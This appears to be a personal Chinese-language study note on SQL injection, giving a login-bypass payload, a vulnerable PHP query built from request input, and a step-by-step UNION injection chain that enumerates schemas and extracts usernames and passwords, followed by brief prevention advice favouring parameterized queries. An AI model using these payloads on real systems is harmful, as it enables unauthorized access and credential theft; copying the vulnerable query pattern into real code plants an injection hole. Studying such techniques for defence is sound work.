---
title: Sql Injection
tags: Network
katex: true
abbrlink: e441acd0
date: 2023-03-12 19:20:48
---

### SQL 基本語法
```
SELECT 欄位 FROM 表格
SELECT 欄位 FROM 表格 UNION 1,2,3,...
```

#### Authrization Bypass
### PHP
```php
$user = $_GET[key=value]
$sql = "SELECT * FROM db WHERE USER = ' ' or 1=1 --"(True) 
```
在登陸介面 name 輸入 `' or 1=1 --` , password隨便輸
|符號|功能|
|--|--|
| '|stop|


```
?catogority=.... 這是向DB 輸 SQL指令
?catogority=' or 1=1 -- 使得DB輸出所為true東西
```

### Union SQL injection
確認有幾個欄位
```PHP
UNION SELECT NULL --
UNION SELECT NULL NULL --
UNION SELECT NULL NULL NULL --
```
確定是不是字串
```PHP
UNION SELECT 'a' NULL NULL
UNION SELECT NULL 'a' NULL 
UNION SELECT NULL NULL 'a'
```
查看有什麼資料
```
information_schema.schemata
information_schema.tables
information_schema.columns
```
EX: 取得某網站管理員帳號
```
'UNION SELECT 'a', 'a' --
'UNION SELECT schema_name, schema_name FROM information_schema.schemata --
'UNION SELECT table_name, table_name FROM information_schema.tables WHERE table_schema = 'public' --
'UNION SELECT column_name, column_name FROM information_schema.columns WHERE table_schema = 'public' AND table_name = 'users' --
'UNION SELECT username, password FROM public.users --
```

### 預防
1. 黑名單
  拒絕含有SQL關鍵字輸入 (駭客總有方法進入, ex: 正則化...)
2. 白名單
   只允許特定字加入SQL
3. 參數化查詢
   最有效防止
   先編譯完再將查詢參數填入(參數不會被當作執行語法)

